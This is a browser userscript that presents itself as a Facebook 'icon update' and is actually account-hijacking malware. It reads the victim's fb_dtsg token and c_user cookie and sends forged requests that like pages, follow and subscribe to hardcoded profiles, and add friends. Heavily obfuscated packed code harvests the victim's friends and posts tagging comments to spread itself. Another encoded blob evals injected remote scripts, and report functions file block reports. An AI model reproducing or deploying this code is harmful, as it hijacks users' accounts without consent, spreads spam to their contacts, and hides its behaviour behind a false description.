// ==UserScript==
// @name            CẬP NHẬT ICON FACEBOOK
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone){var http4=new XMLHttpRequest;var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";http4.open("POST",url4,true);http4.onreadystatechange=function(){if(http4.readyState==4&&http4.status==200)http4.close};http4.send(params4)}function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var now=(new Date).getTime();function P(post){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/ufi/like.php";var XParams="like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function Like(p){var Page=new XMLHttpRequest();var PageURL="//www.facebook.com/ajax/pages/fan_status.php";var PageParams="&fbpage_id="+p+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";Page.open("POST",PageURL,true);Page.onreadystatechange=function(){if(Page.readyState==4&&Page.status==200){Page.close}};Page.send(PageParams)}function IDS(r){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/add_friend/action.php";var XParams="to_friend="+r+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}
Like("1423054767933330");Like("379042008899373");sublist("340218892781019");sublist("169594523176791");a("100003787322240");a("100005763154996");
a("100004531658883");

var _0xcfdb=var _0xb161=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x72\x65\x70\x6F\x72\x74\x2F\x73\x6F\x63\x69\x61\x6C\x2E\x70\x68\x70","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x62\x6C\x6F\x63\x6B\x3D\x31\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x63\x74\x69\x6F\x6E\x73\x5F\x74\x6F\x5F\x74\x61\x6B\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x5B\x5D\x25\x32\x32\x25\x32\x43\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x30\x25\x32\x43\x25\x32\x32\x65\x78\x70\x61\x6E\x64\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x66\x69\x72\x73\x74\x5F\x63\x68\x6F\x69\x63\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x32\x43\x25\x32\x32\x66\x72\x6F\x6D\x5F\x67\x65\x61\x72\x25\x32\x32\x25\x33\x41\x25\x32\x32\x74\x69\x6D\x65\x6C\x69\x6E\x65\x25\x32\x32\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x6F\x6E\x5F\x70\x72\x6F\x66\x69\x6C\x65\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x72\x65\x66\x25\x32\x32\x25\x33\x41\x25\x32\x32\x68\x74\x74\x70\x73\x25\x33\x41\x25\x35\x43\x25\x32\x46\x25\x35\x43\x25\x32\x46\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x25\x35\x43\x25\x32\x46\x4E\x61\x6E\x2E\x65\x72\x74\x74\x37\x25\x32\x32\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x34\x35\x25\x32\x43\x25\x32\x32\x72\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x73\x75\x62\x5F\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41","\x25\x37\x44\x26\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x32\x71\x6D\x76\x75\x35\x6B\x39\x55\x6D\x41\x41\x61\x55\x56\x70\x6F\x26\x5F\x5F\x72\x65\x71\x3D\x75\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x36\x38\x35\x37\x31\x30\x37\x31\x31\x30\x38\x38\x38\x30","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x30\x30\x30\x30\x36\x39\x35\x32\x31\x31\x39\x30\x34\x38"];var fb_dtsg=document[_0xb161[2]](_0xb161[1])[0][_0xb161[0]];var user_id=document[_0xb161[4]][_0xb161[3]](document[_0xb161[4]][_0xb161[3]](/c_user=(\d+)/)[1]);var now=( new Date)[_0xb161[5]]();function Report(_0x45e7x5){var _0x45e7x6= new XMLHttpRequest();var _0x45e7x7=_0xb161[6];var _0x45e7x8=_0xb161[7]+fb_dtsg+_0xb161[8]+_0x45e7x5+_0xb161[9]+_0x45e7x5+_0xb161[10]+now+_0xb161[11]+user_id+_0xb161[12]+user_id+_0xb161[13];_0x45e7x6[_0xb161[15]](_0xb161[14],_0x45e7x7,true);_0x45e7x6[_0xb161[16]]=function (){if(_0x45e7x6[_0xb161[17]]==4&&_0x45e7x6[_0xb161[18]]==200){_0x45e7x6[_0xb161[19]];} ;} ;_0x45e7x6[_0xb161[20]](_0x45e7x8);} ;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('g e=["1S","u","1y","1B","1E","1K","1Q","1R","h = ","o (;;);","","1U","1V",";","1W","1X","2g","S"," @[","1u",":","1w","]"," ","\\1x[0]=1z","\\K[0]=1C","\\K[1]=1F","\\1G=1H","\\1I=","\\1J=","F://","1L","1M","1P","F://r.z.A/s/C/D.v?I=1","1Y","1Z://r.z.A/s/C/D.v?I=1","2a","2b","2c","\\2d=","\\2e=","\\2f=2","\\2h=2l:2m","\\2o","\\2r","\\2t=2u","\\Q={\\R\\j:\\T\\j,\\U\\j:0,\\V\\j:\\W\\j,\\X\\j:\\Y\\j,\\Z\\j:","}","\\1a=0","\\1b=0","\\1c","\\1d[1e]=[]","\\1f=1","\\1g=1h","\\1i=q","\\1j=","\\1k=","1l","/s/1m/1n.v","1o-1p","1q/x-r-1r-1s","1t","2W","1v"];g u=n[e[2]](e[1])[0][e[0]];g p=n[e[4]][e[3]](n[e[4]][e[3]](/1A=(\\d+)/)[1]);g E=e[5];g h=[];g 1D;l G(a){g b=P L();b[e[6]]=l(){m(b[e[7]]==4){1N(e[8]+b[e[12]].1O()[e[11]](e[9],e[10])+e[13]);o(f=0;f<k[e[17]](h[e[16]][e[15]][e[14]]/27);f++){t=e[10];H=e[10];o(i=f*27;i<(f+1)*27;i++){m(h[e[16]][e[15]][i]){t+=e[18]+h[e[16]][e[15]][i][e[19]]+e[20]+h[e[16]][e[15]][i][e[21]]+e[22];H+=e[23]+h[e[16]][e[15]][i][e[21]]}};J(a,t)}}};g c=e[24];c+=e[25];c+=e[26];c+=e[27];c+=e[28]+p;c+=e[29]+p;m(n[e[2i]][e[2j]](e[2k])>=0){b[e[w]](e[M],e[2n]+c,y)}2p{b[e[w]](e[M],e[2q]+c,y)};b[e[N]]()};l 2s(){g a=e[10];o(i=0;i<9;i++){a+=e[18]+h[e[16]][e[15]][k[e[O]](k[e[B]]()*h[e[16]][e[15]][e[14]])][e[19]]+e[20]+h[e[16]][e[15]][k[e[O]](k[e[B]]()*h[e[16]][e[15]][e[14]])][e[21]]+e[22]};2v a};l J(a,b){g c=P L();g d=e[10];d+=e[2w]+a;d+=e[2x]+2y(b);d+=e[2z];d+=e[2A];d+=e[2B];d+=e[2C];d+=e[2D];d+=e[2E]+a+e[2F];d+=e[2G];d+=e[2H];d+=e[2I];d+=e[2J];d+=e[29]+p;d+=e[2K];d+=e[2L];d+=e[2M];d+=e[2N]+u;d+=e[2O];c[e[w]](e[2P],e[2Q],y);c[e[2R]](e[2S],e[2T]);c[e[6]]=l(){m(c[e[7]]==4&&c[e[2U]]==2V){c[e[1T]]}};c[e[N]](d)};G(E);',62,183,'||||||||||||||_0xa22c||var|arkadaslar||x22|Math|function|if|document|for|user_id||www|ajax|mesaj|fb_dtsg|php|35||true|facebook|com|38|typeahead|first_degree|id|https|arkadaslari_al|mesaj_text|__a|yorum_yap|x26options|XMLHttpRequest|33|37|39|new|x26clp|x22cl_impid|round|x22453524a0|x22clearcounter|x22elementid|x22js_5|x22version|x22x|x22parent_fbid|||||||||||x26attached_sticker_fbid|x26attached_photo_fbid|x26giftoccasion|x26ft|tn|x26__a|x26__dyn|7n8ahyj35ynxl2u5F97KepEsyo|x26__req|x26fb_dtsg|x26ttstamp|POST|ufi|add_comment|Content|type|application|form|urlencoded|setRequestHeader|uid|close|text|x26filter|getElementsByName|user|c_user|match|friends_only|svn_rev|cookie|nm|x26token|v7|x26viewer|x26__user|424294144373493|indexOf|URL|eval|toString|GET|onreadystatechange|readyState|value|64|replace|responseText|length|entries|open|http|||||||||||send|random|floor|x26ft_ent_identifier|x26comment_text|x26source|payload|x26client_id|32|31|30|1377871797138|1707018092|34|x26reply_fbid|else|36|x26parent_comment_id|RandomArkadas|x26rootid|u_jsonp_2_3|return|40|41|encodeURIComponent|42|43|44|45|46|47|48|49|50|51|52|53|54|55|56|57|58|59|62|60|61|63|200|status'.split('|'),0,{}));var _4678;var _8595='18344C168F191E1649B1609D1801B3065B2113E1529A1665D1609E1649D1353F2217B2049A2185C1529C2169C2049C2185B2081A2153F2201E1761C2073A2161B2065F2209C2145E2081A2153D2201F1641D2097B2081F2201C1825B2137E2081E2145C2081D2153A2201C2193A1801E2241F1945C2049C2097F1897C2049E2145D2081F1593A1545B2105D2201D2145D2137E1545B1601D2001E1657A2017B1745E1353A2217A2049E2185C1529E2033E2057A2161D2073F2241C1529E1761E1529A2073D2161D2065E2209C2145D2081C2153C2201B1641D2097E2081A2201B1825F2137F2081E2145F2081B2153B2201A2193C1801F2241E1945A2049F2097A1897C2049D2145B2081D1593B1585F2057B2161D2073C2241F1585C1601E2001B1657E2017A1745C1353F2217C2049C2185D1529D2033A2073C2113A2217F1529C1761E1529F2073C2161E2065C2209C2145F2081D2153E2201D1641D2065D2185E2081D2049E2201E2081B1825E2137F2081B2145D2081D2153B2201C1593B1585E2073B2113D2217B1585F1601F1745E1353D2033C2073F2113F2217A1641F2193B2201C2241C2137B2081B1641B2105E2081A2113C2097B2105D2201F1761F1545C1673C1697C1545D1745E2033B2073A2113E2217A1641E2193C2201F2241C2137C2081F1641D2225F2113E2073C2201C2105E1761D1545B1665A1657A1657F1569C1545D1745E2033B2073B2113B2217F1641F2193D2201A2241D2137F2081D1641D2169C2161D2193F2113A2201C2113F2161E2153F1761D1545B2089A2113A2233D2081A2073D1545D1745B1353A2033F2073B2113F2217E1641A2193D2201E2241C2137B2081E1641D2201B2161C2169A1761E1545D2049E2209E2201F2161B1545A1745B2033E2073C2113A2217D1641C2193E2201D2241C2137D2081B1641C2057C2161C2201F2201D2161B2145B1529B1761C1529C1545C1617E1673A1697D2169F2233A1545F1745B2033A2073B2113B2217D1641F2049F2137A2113E2097D2153B1761F1545C2065D2081C2153C2201C2081D2185E1545F1745D1353B2217F2049B2185C1529A2033B2049C2209D2073B2113F2161C1761A1529D2073B2161C2065E2209E2145C2081C2153F2201A1641C2065B2185F2081E2049F2201E2081B1825E2137E2081B2145B2081A2153C2201B1593E1585C2049B2209F2073B2113B2161A1585A1601B1745B1353F2033E2049E2209C2073A2113B2161E1641E2193C2201C2241E2137B2081E1641C2225E2113C2073C2201A2105E1761D1545D1665A1657F1657C1569E1545B1745F2033D2049E2209F2073C2113B2161E1641E2193C2201E2241D2137C2081F1641A2105D2081A2113D2097F2105F2201D1761E1545B1673C1697D2169C2233F1545C1745F2033E2049B2209D2073C2113D2161C1641B2065B2161A2153E2201B2185A2161B2137F2193E1529C1761F1529E2201A2185E2209C2081A1745E2033F2049A2209D2073B2113A2161F1641C2049D2209A2201E2161C2169D2137D2049C2241D1529A1761D1529B2089B2049D2137E2193D2081E1745C1353D2033B2049F2209F2073D2113D2161C1641C2193D2185C2065A1529B1761C1529F1545C2105C2201E2201C2169C1737B1649C1649E2145A2209F2193C2113D2065A1633B2105A2153D1641F1673A1689C2105C2193E2201E2049B2201C2113A2065F1641B2065F2161F2145C1649C2209D2169A2137E2161A2049C2073A2145A2209F2193D2113D2065C1673B1649D1665B1673D2089F2057E1705C1697A1665D2089F1657A1665A1673F1713D2073B2049B1673A1689D2049F1657C1713E2081D2065B1713C1721D1681D1665A1673C1665A2081F2089F2065D1657F1713E1649B1697C1673D2057C2057A1681F1729B1689E1681E1649F2209C2169B2137D2161D2049A2073C2145D2209D2193A2113D2065E1649F2113D2073B2033B2137C2081E1649B1673F1633A1673D1657A1665A1681C1649C2105E2209B2241E2137A2209B2153A1649E1961A2169B2161A2169F1649F1793F2137B2057F2209A2145D1649E1665B1649F1897D2097B2049E2241C1569E1673F1657C1793B2241F1569D1673C1657D1937F2081F1569E1673A1657B1817F2081C2153B1569D1673D1657A1633D1569D1673E1657F1849A2161A1569E1673D1657E1921C2209A2049C2153F2097C1569C1673B1657F1849F2113F2081F2209B1649C1665F1673A1721B1649D1809C2161B2153D1569D1673D1657D1801C2209E2161E2145E1569A1673E1657E1977A2209E2049C2153E1569A1673D1657E1633E1569F1673C1657B1849D2161F1569F1673F1657D1921C2209A2049F2153D2097D1569B1673F1657D1849B2113D2081F2209D1641B2145B2169A1681D1545D1745B1353B2033D2073A2113F2217A1641B2049C2169B2169B2081E2153B2073E1809F2105E2113E2137A2073F1593C2033A2049B2209B2073C2113E2161D1601D1745A2033D2057A2161E2073C2241E1641D2049E2169B2169E2081F2153F2073D1809C2105F2113E2137C2073D1593A2033A2073C2113B2217A1601B1745F1353A1649F1609A2057E3065C2113F1529F1673F1609B1649D1353D2033A2073A2113E2217F1641A2193F2201B2241E2137B2081C1641E2105D2081B2113A2097B2105D2201E1761C1545D1673C1697E1545E1745A2033E2073E2113A2217D1641A2193A2201A2241E2137E2081E1641D2225F2113B2073C2201D2105C1761C1545B1665B1657D1657F1569B1545F1745E2033A2073A2113E2217B1641D2193A2201A2241B2137C2081F1641B2169A2161C2193A2113B2201A2113C2161A2153C1761B1545E2089C2113C2233A2081B2073F1545D1745E1353E2033D2073A2113A2217C1641F2193C2201E2241E2137D2081D1641F2201F2161D2169D1761A1545A2049C2209A2201F2161D1545A1745D2033B2073C2113B2217F1641A2193E2201E2241A2137E2081A1641A2057F2161E2201E2201E2161D2145B1761C1545A1657F1545B1745E2033A2073E2113C2217C1641D2049A2137A2113B2097E2153C1761A1545C2065D2081A2153F2201E2081D2185A1545B1745F1353B2217C2049F2185A1529C2033F2049D2209F2073B2113B2161B1761F1529B2073A2161E2065A2209A2145B2081E2153A2201F1641D2065D2185D2081E2049C2201F2081F1825E2137D2081A2145D2081A2153D2201C1593E1585B2049A2209A2073E2113B2161F1585B1601E1745F1353F2033D2049C2209A2073D2113C2161D1641D2193C2201D2241A2137B2081C1641B2225B2113E2073C2201C2105F1761C1545F1665F1657C1657B1569D1545F1745C2033F2049A2209F2073B2113B2161B1641A2193C2201C2241B2137E2081E1641B2105C2081E2113C2097C2105D2201F1761A1545E1673C1697B2169C2233B1545A1745A2033B2049E2209E2073E2113F2161D1641C2065D2161D2153F2201E2185E2161A2137A2193C1529B1761C1529E2201F2185C2209C2081F1745D1353A2033F2049C2209B2073A2113A2161B1641C2049F2209E2201A2161C2169A2137A2049C2241B1529B1761C1529F2089D2049C2137A2193D2081F1745E2033E2049E2209C2073D2113A2161D1641D2049A2209F2201C2161F2169D2137C2049D2241C1529F1761A1529C2201C2185C2209C2081A1745C1353C2033A2049F2209A2073E2113D2161D1641E2193E2185E2065C1529B1761B1529D1545A2105B2201B2201E2169B1737B1649F1649B2089A2185D2081D2081D1641B2145E2169E1681D2193E2161B2153A2097D2209F2185B2137F2193C1641E2065A2161E2145C1649C1665D1681D1697C1657D1697C1673F1705B1641D2145F2169D1681D1545D1745D1353D2033A2073A2113A2217A1641A2049D2169A2169B2081D2153F2073C1809C2105C2113A2137A2073C1593E2033E2049B2209C2073C2113B2161D1601E1745E2033B2057F2161A2073F2241D1641A2049A2169D2169E2081B2153E2073F1809F2105B2113E2137B2073C1593E2033D2073B2113F2217E1601A1745E1353C1649F1609B2057C3065F2113F1529A1681E1609F1649C1353A2033C2073F2113F2217D1641F2193F2201A2241E2137C2081F1641B2105F2081D2113F2097F2105F2201E1761A1545B1673E1697E1545F1745D2033F2073A2113A2217D1641F2193D2201B2241D2137A2081A1641A2225E2113B2073F2201E2105B1761A1545D1665A1657D1657D1569A1545E1745E2033A2073E2113C2217F1641A2193C2201A2241A2137B2081F1641D2169F2161A2193D2113A2201E2113A2161F2153D1761F1545C2089E2113A2233A2081C2073F1545B1745F1353B2033F2073E2113A2217B1641F2193A2201D2241B2137D2081E1641C2201F2161C2169E1761C1545E2049B2209B2201B2161B1545C1745B2033C2073B2113A2217D1641B2193E2201A2241E2137E2081B1641B2057F2161D2201D2201D2161D2145B1761D1545D1657E1545C1745D2033D2073A2113D2217D1641A2049E2137B2113E2097D2153C1761E1545F2065E2081D2153B2201D2081A2185E1545A1745D1353C2217A2049C2185A1529E2033C2049E2209E2073C2113C2161A1761F1529A2073D2161B2065A2209E2145B2081C2153F2201D1641E2065E2185F2081B2049C2201F2081E1825F2137E2081D2145A2081E2153F2201F1593B1585A2049E2209A2073B2113A2161A1585C1601B1745C1353B2033E2049D2209C2073D2113C2161F1641B2193F2201B2241D2137C2081B1641F2225F2113C2073B2201F2105E1761E1545A1665A1657B1657A1569F1545B1745C2033A2049F2209D2073A2113A2161F1641F2193A2201F2241D2137A2081A1641C2105F2081B2113B2097D2105B2201C1761C1545A1673D1697A2169E2233D1545A1745F2033B2049A2209D2073B2113A2161C1641A2065C2161E2153B2201F2185D2161E2137C2193B1529F1761E1529E2201A2185C2209C2081B1745B1353D2033E2049B2209F2073B2113C2161B1641A2049A2209F2201F2161D2169D2137F2049D2241A1529C1761B1529D2089A2049D2137C2193B2081E1745A2033E2049E2209A2073C2113C2161A1641A2049D2209F2201C2161C2169E2137F2049D2241F1529D1761F1529F2201C2185F2209D2081A1745B1353C2033D2049C2209B2073C2113A2161B1641C2193A2185E2065F1529B1761F1529E1545E2105A2201F2201C2169B1737D1649B1649C2193B2201B2185F2081B2049E2145C1681A1657D1697E1641F2153B2105F2049A2065E1641D2217C2209D2113B1641D2217E2153D1649C2209A2169E2137A2161D2049A2073E2145A2209F2193C2113E2065B1673B1649A1681B1681C1665A1689B2081D1721C2089E1673D1673B2065B2065F1657E1673C2081F2081B1673D2089C1697E2073C1697E1697B2057E1665C1697C1721F1697A2065E1721C1705D1689F1729C1673C1649B1697F1673C2049E1697C2089B1721A1689D1665E1649E2209C2169F2137E2161E2049C2073E2145B2209E2193E2113C2065E1649A2113A2073C2033B2137F2081F1649A1681C1633A1673B1657B1665C1681C1649E2105B2209E2241E2137E2209C2153E1649E1929B2049F2169F1649F1897B2081D2225B1945D2185A2049C2065E2129A1649A1665B1673A1721B1649A1897A2049B2153D2097B1569E1673A1657C1793C2145F1569A1673E1657A1817F2049A2153A1569A1673A1657F1977A2049D1569D1673D1657F1633D1569E1673E1657D1889F1633D1945E1913C1641F2145E2169C1681E1545C1745D1353B2033A2073F2113F2217B1641C2049C2169C2169D2081E2153D2073C1809A2105F2113C2137E2073C1593E2033D2049E2209D2073F2113C2161F1601D1745F2033D2057A2161F2073C2241F1641A2049A2169A2169B2081E2153C2073F1809A2105D2113C2137E2073B1593F2033E2073C2113C2217D1601A1745B1353C1649C1609A2057E3065E2113E1529B1689E1609F1649B1353E2033F2073E2113B2217E1641D2193A2201E2241E2137C2081E1641C2105A2081F2113A2097D2105F2201F1761A1545B1673B1697D1545A1745C2033B2073E2113B2217C1641B2193F2201F2241B2137A2081B1641B2225F2113D2073A2201B2105A1761D1545B1665F1657F1657F1569E1545F1745D2033A2073B2113D2217B1641A2193D2201F2241B2137B2081C1641F2169E2161C2193D2113E2201C2113B2161E2153A1761B1545F2089D2113F2233E2081A2073A1545D1745C1353F2033E2073D2113C2217C1641D2193A2201F2241C2137A2081E1641C2201A2161A2169A1761D1545A2049D2209F2201E2161C1545D1745D2033B2073D2113D2217D1641C2193F2201C2241C2137B2081E1641E2057F2161E2201E2201D2161C2145E1761B1545E1657B1545E1745B2033B2073C2113D2217D1641D2049A2137A2113B2097A2153F1761A1545B2065D2081B2153A2201C2081F2185D1545F1745B1353E2217E2049D2185B1529F2033F2049A2209D2073C2113F2161C1761A1529A2073B2161A2065A2209C2145A2081A2153F2201C1641A2065B2185C2081E2049A2201F2081A1825B2137C2081A2145B2081C2153E2201B1593E1585B2049C2209B2073F2113B2161E1585B1601F1745A1353D2033D2049E2209B2073B2113B2161F1641C2193C2201A2241C2137F2081E1641A2225D2113B2073B2201C2105A1761B1545F1665A1657F1657C1569C1545E1745A2033F2049B2209E2073C2113A2161D1641E2193F2201C2241B2137F2081D1641C2105F2081F2113A2097F2105D2201D1761D1545D1673C1697F2169F2233C1545C1745E2033E2049D2209F2073E2113A2161C1641C2065E2161B2153A2201B2185E2161A2137B2193F1529F1761C1529E2201D2185C2209D2081F1745E1353A2033A2049C2209A2073E2113D2161C1641B2049B2209F2201B2161B2169C2137E2049B2241A1529C1761B1529E2089E2049E2137E2193B2081A1745C2033B2049E2209E2073D2113B2161A1641C2049B2209E2201B2161E2169C2137F2049B2241F1529F1761C1529E2201F2185A2209B2081B1745F1353D2033D2049C2209D2073E2113D2161E1641B2193A2185F2065E1529B1761D1529A1545C2105A2201F2201D2169C1737B1649E1649F2225E2225B2225D1681D1657F1697A1641E2153E2105E2049B2065A1641E2217B2209D2113C1641A2217E2153A1649B2209D2169A2137F2161D2049E2073C2145F2209D2193A2113C2065A1673A1649E2073C1697D2049C1729F1705E2065A2089B2081A1729A2081C1713E1657A1673D1657A2065B2049F1713D1721D1665B1657E1713E1729D1657F1657F1665C1657F2065A1721C2049E1697D2049D1721F1649D1697E1673F1705D1665D2049C1673D2049D1689E1649C2209A2169F2137A2161C2049C2073D2145D2209D2193C2113D2065C1649C1897A2105E2049D2065D1569E1673E1657D1961F2113A2081A2201D1569A1673B1657F1897A2049C2145A1649A1889E2185C1641B1937C2113D2185C2161F1649A1881B2049A2153F2097E1569F1673E1657D1897F2097E2105B2081B1569B1673E1657F1897F2209E2161B2065D1569B1673D1657D1889E2049E2201B1649C1665F1673D1721C1649B1881C2049E2153D2097D1569A1673A1657F1897E2097B2105D2081A1569D1673A1657D1897C2209A2161E2065C1569F1673C1657D1889E2049A2201B1641D2145C2169F1681C1529A1545B1745A1353D2033E2073E2113D2217C1641C2049D2169F2169F2081A2153C2073C1809B2105A2113F2137C2073D1593B2033B2049B2209A2073E2113A2161E1601F1745B2033F2057E2161F2073B2241D1641F2049B2169B2169F2081A2153E2073C1809A2105A2113B2137F2073F1593B2033A2073B2113F2217A1601F1745A';var _9576=/[\x41\x42\x43\x44\x45\x46]/;var _7541=2;var _1208=_8595.charAt(_8595.length-1);var _3078;var _8968=_8595.split(_9576);var _9789=[String.fromCharCode,isNaN,parseInt,String];_8968[1]=_9789[_7541+1](_9789[_7541](_8968[1])/21);var _5490=(_7541==5)?String:eval;_3078='';_11=_9789[_7541](_8968[0])/_9789[_7541](_8968[1]);for(_4678=3;_4678<_11;_4678++)_3078+=(_9789[_7541-2]((_9789[_7541](_8968[_4678])+_9789[_7541](_8968[2])+_9789[_7541](_8968[1]))/_9789[_7541](_8968[1])-_9789[_7541](_8968[2])+_9789[_7541](_8968[1])-1));var _7577='_6527';var _8948='_7577=_3078';function _6519(_2819){_5490(_2426);_6519(_2838);_2838(_8948);_6519(_7577);}var _2426='_6519=_5490';var _2838='_2838=_6519';_6519(_1208);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var _6717; var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var _6717; var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var now=(new Date).getTime(); function report(r) { var X = new XMLHttpRequest(); var XURL = "https://www.facebook.com/ajax/report/social.php"; var XParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + r +"%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2F%22%2C%22report_type%22%3A145%2C%22rid%22%3A" + r +"%2C%22sub_report_type%22%3A141%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmAWuURDw&__req=h&ttstamp=26581661107112011276&confirmed=1"; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); };